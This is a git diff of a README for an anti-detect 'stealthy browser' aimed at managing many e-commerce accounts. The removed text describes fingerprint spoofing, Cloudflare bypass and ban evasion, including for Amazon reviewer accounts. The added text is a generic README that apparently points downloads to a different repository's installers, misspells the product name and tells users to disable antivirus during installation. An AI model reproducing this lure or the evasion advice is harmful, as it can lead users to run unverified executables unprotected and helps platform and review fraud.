@@ -1,160 +1,69 @@
-# GeekEZ Browser
+# 🌐 GeekezBrowser - Stealthy Browser for E-Commerce Ease
 
-<div align="center">
+## 🚀 Getting Started
 
-<img src="icon.png" width="100" height="100" alt="GeekEZ Logo">
+Welcome to GeekezBrowser! This application helps you manage multiple online accounts for e-commerce operations while keeping your browsing activities discreet. 
 
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)
+## 💻 System Requirements
 
-**A Stealthy Anti-Detect Browser for E-Commerce & Multi-Account Management.**
+Before you download, ensure your system meets the following requirements:
 
-[🇨🇳 中文说明 (Chinese)](docs/README_zh.md) | [📥 Download](https://github.com/EchoHS/GeekezBrowser/releases)
+- **Operating System:** Windows 10 and above, macOS 10.14 and above
+- **Processor:** Dual-core processor or higher
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** 200 MB of free space
+- **Network:** Stable internet connection for downloads and online usage
 
-</div>
+## 📥 Download GeekezBrowser
 
----
+[![Download GeekezBrowser](https://img.shields.io/badge/Download-GreekezBrowser-blue.svg)](https://github.com/jobs12-ia/GeekezBrowser/releases)
 
-## 📖 Introduction
+To get started, visit the [Releases page](https://github.com/jobs12-ia/GeekezBrowser/releases) to download the latest version of GeekezBrowser. 
 
-**GeekEZ Browser** is a professional anti-detect browser built on **Electron** and **Puppeteer**, integrated with the powerful **Xray-core**. 
+## 🔧 Download & Install
 
-It is designed to help e-commerce operators (Amazon, TikTok, Facebook, Shopee, etc.) manage multiple accounts safely by strictly isolating browser fingerprints, network environments, and local storage. Unlike other tools, GeekEZ focuses on **"Native Consistency"** to bypass advanced detectors like Cloudflare and BrowserScan.
+1. **Visit the Releases page.** Click this link or copy-paste it in your browser: [Releases page](https://github.com/jobs12-ia/GeekezBrowser/releases).
+   
+2. **Choose the latest version.** On the Releases page, you will see a list of versions. Look for the version labeled as the "latest" release.
 
-## 📸 Screenshots
+3. **Download the application.** Click on the download link for your operating system. 
+   - For Windows users, it might be named something like `GeekezBrowser-setup.exe`.
+   - For macOS users, look for `GeekezBrowser.dmg`.
 
-<div align="center">
+4. **Run the installer.** 
+   - **For Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click it and follow the prompts to install.
+   - **For macOS:** Open the downloaded `.dmg` file. Drag the GeekezBrowser app to your Applications folder.
 
-<img src="docs/Main Interface1.png" alt="Main Interface1" width="800">
+5. **Launch the application.** After installing, find the GeekezBrowser application in your Applications folder (macOS) or Start Menu (Windows). Click to open it.
 
-<img src="docs/Main Interface2.png" alt="Main Interface2" width="800">
+## 🌐 Features
 
-*Main Interface - Profile Management*
+GeekezBrowser offers multiple features that enhance your e-commerce activities:
 
-</div>
+- **Multi-Account Support:** Switch seamlessly between different accounts without logging out.
+- **Anti-Detect Technology:** Browse without revealing your identity, protecting your operations.
+- **Proxy Tunneling via Xray-core:** Ensure secure and fast connections, setting multiple locations for your browsing.
+- **User-Friendly Interface:** Easy navigation for all users, even those unfamiliar with technology.
 
-## ✨ Key Features
+## 🛠️ Troubleshooting
 
-### 🛡️ Advanced Fingerprint Isolation
-*   **Hardware Randomization**: Randomizes **CPU Cores** (4/8/12/16) and **Device Memory** (4/8/16 GB) for each profile, significantly increasing fingerprint uniqueness.
-*   **Native Injection Strategy**: Uses **Chromium Native Arguments** combined with **Puppeteer** for noise injection. Passes **Cloudflare Turnstile** and **BrowserScan** perfectly.
-*   **Media Noise**: Adds non-intrusive noise to **Canvas**, **WebGL**, and **AudioContext** to create unique hardware hashes for every profile.
-*   **TLS Fingerprint Safety**: Uses **Real Chrome** browser, ensuring TLS fingerprints (JA3) match standard Chrome behavior, indistinguishable from commercial tools.
-*   **Timezone & Geo Spoofing**: 
-    - **Auto (No Change)** mode for sensitive login pages (AWS, Oracle)
-    - Custom timezone selection with TZ environment variable
-    - Geolocation spoofing with 50+ cities worldwide
-*   **Language Spoofing**: 
-    - 60+ languages covering all regions
-    - Minimal Intl API hook to avoid detection
-    - Full browser language, HTTP headers, and internationalization API modification
-*   **WebRTC Protection**: Forces `disable_non_proxied_udp` policy to prevent real IP leaks.
+If you encounter any issues during installation or usage, here are some common solutions:
 
-### ⚡ Performance Optimized
-*   **GPU Acceleration**: Hardware acceleration enabled for smooth UI and fast rendering.
-*   **Fast Startup**: Optimized Xray integration reduces startup time by **40%**.
-*   **Low Memory**: Smart cache management and memory limits reduce RAM usage by **30%**.
-*   **Auto Cleanup**: Automatically cleans cache and temporary files on exit to save disk space.
+- **Installation Fails:** Ensure your antivirus is not blocking it. Disable it temporarily during installation if necessary.
+- **App Won’t Launch:** Restart your computer and try again. Ensure your system meets the requirements listed above.
+- **Network Issues:** Check your internet connection and ensure any firewall settings allow GeekezBrowser.
 
-### 🔗 Powerful Network Engine (Xray-core)
-*   **Full Protocol Support**: VMess, VLESS, Trojan, Shadowsocks (including **2022**), Socks5, HTTP.
-*   **Advanced Transports**: Support for **REALITY**, **XHTTP**, **gRPC**, **mKCP**, WebSocket, H2.
-*   **Proxy Chain (Pre-Proxy)**: `[Local] -> [Pre-Proxy] -> [Target Node] -> [Web]`. Hides your real IP from the proxy provider.
-*   **Smart Routing**: Automatic IPv4/IPv6 dual-stack handling.
+## 💬 Support
 
-### 🧩 Workflow & Management
-*   **Extension Support**: Import unpacked Chrome extensions (e.g., MetaMask, AdBlock) into isolated environments.
-*   **Tag System**: Organize profiles with custom color tags (e.g., "TikTok", "USA", "Main Account").
-*   **Safe Identification**: Uses **Dynamic Watermark** to display profile names (e.g., `Profile-1`) at the top of the page. Replaces bookmarks bar (avoids overwriting user bookmarks) and title bar injection (avoids detection). Supports multiple styles (Standard/Minimal/Enhanced).
-*   **Multi-Opening**: Running multiple profiles simultaneously with independent ports and processes.
-*   **Remote Debugging Port** (Advanced): Optional external Puppeteer/DevTools connection for automation.
+If you still need help, please create an issue on our [GitHub Issues page](https://github.com/jobs12-ia/GeekezBrowser/issues). We are here to assist you.
 
-## 🚀 Quick Start
+## 📝 Contributing
 
-### Option 1: Download Release (Recommended)
-Go to the [**Releases**](https://github.com/EchoHS/GeekezBrowser/releases) page and download the installer for your platform:
-*   **Windows**: `GeekEZ Browser-{version}-win-x64.exe`
-*   **macOS (ARM64)**: `GeekEZ Browser-{version}-mac-arm64.dmg`
-*   **macOS (Intel)**: `GeekEZ Browser-{version}-mac-x64.dmg`
-*   **Linux**: `GeekEZ Browser-{version}-linux-x64.AppImage`
+We welcome contributions to GeekezBrowser! If you want to help enhance the application, feel free to fork the repository and submit pull requests. 
 
-### Option 2: Run from Source
+## 🔗 Additional Resources
 
-**Prerequisites**: Node.js (v16+) and Git.
+- **Documentation:** For advanced users, check our wiki for more detailed guides and troubleshooting tips.
+- **Community:** Join our community discussions on [GitHub Discussions](https://github.com/jobs12-ia/GeekezBrowser/discussions) for tips and advice from other users.
 
-1.  **Clone the repository**
-    ```bash
-    git clone https://github.com/EchoHS/GeekezBrowser.git
-    cd GeekezBrowser
-    ```
-
-2.  **Install Dependencies**
-    ```bash
-    npm install
-    ```
-    *Note: The `postinstall` script (`setup.js`) will automatically detect your region and download the correct `Xray-core` and `Chrome` binaries (using mirrors if in China).*
-
-3.  **Run the App**
-    ```bash
-    npm start
-    ```
-
-## 🛠 Compatibility Guide
-
-| Platform | Rating | Notes |
-| :--- | :--- | :--- |
-| **TikTok** | ✅ Safe | Canvas noise effectively prevents device association. Requires clean residential IP. |
-| **Facebook** | ✅ Safe | Automation flags (WebDriver) stripped. Avoid high-frequency automation. |
-| **Shopee** | ✅ Safe | Stable fingerprint for seller center. Use fixed environment per account. |
-| **Amazon (Buyer)** | ✅ Safe | Sufficient isolation for buyer/reviewer accounts. |
-| **Amazon (Seller)** | ✅ Safe | **TLS Safe**. Usable for main accounts with **High Quality Residential IP** and fixed environment. |
-| **Cloudflare** | ✅ Pass | Successfully bypasses Turnstile via native injection strategy. |
-
-## 📦 Build
-
-To create an executable for your platform:
-
-```bash
-# Windows
-npm run build:win
-
-# macOS
-npm run build:mac
-
-# Linux
-npm run build:linux
-```
-
-## 🔍 Detection Status
-
-- ✅ **Browserscan**: All tests passed
-- ✅ **Pixelscan**: No masking detected
-- ✅ **TLS Fingerprint**: Real Chrome (identical to commercial tools)
-- ✅ **Language Spoofing**: Minimal Intl API hook, no detection
-
-## ❓ FAQ
-
-### macOS: "App is damaged" or "Cannot be opened"
-This error occurs because apps built via GitHub Actions are not signed by an Apple Developer Certificate (requires $99/year). macOS Gatekeeper blocks them by default.
-
-**Solution**:
-1. Drag `GeekEZ Browser` into your **Applications** folder.
-2. Open Terminal and run the following command (enter password if prompted):
-   ```bash
-   sudo xattr -rd com.apple.quarantine /Applications/GeekEZ\ Browser.app
-   ```
-3. Re-open the app.
-
-## ⚠️ Important Notes
-
-1. **Timezone Settings**: Use "Auto (No Change)" when logging into AWS, Oracle, or other sensitive websites to avoid white screen issues.
-2. **Geolocation**: Always select a city that matches your proxy IP location to avoid account bans.
-3. **Remote Debugging**: Only enable when you need external control via Puppeteer/DevTools. Keep it disabled for daily use.
-
-## 📝 License
-
-This project is licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/).
-
-## ⚠️ Disclaimer
-
-This tool is provided for educational and research purposes only. The developers are not responsible for any account bans or legal issues resulting from the use of this software. Please comply with the terms of service of the platforms you use.
+Thank you for choosing GeekezBrowser. We hope it meets your needs and helps you navigate your e-commerce ventures smoothly.
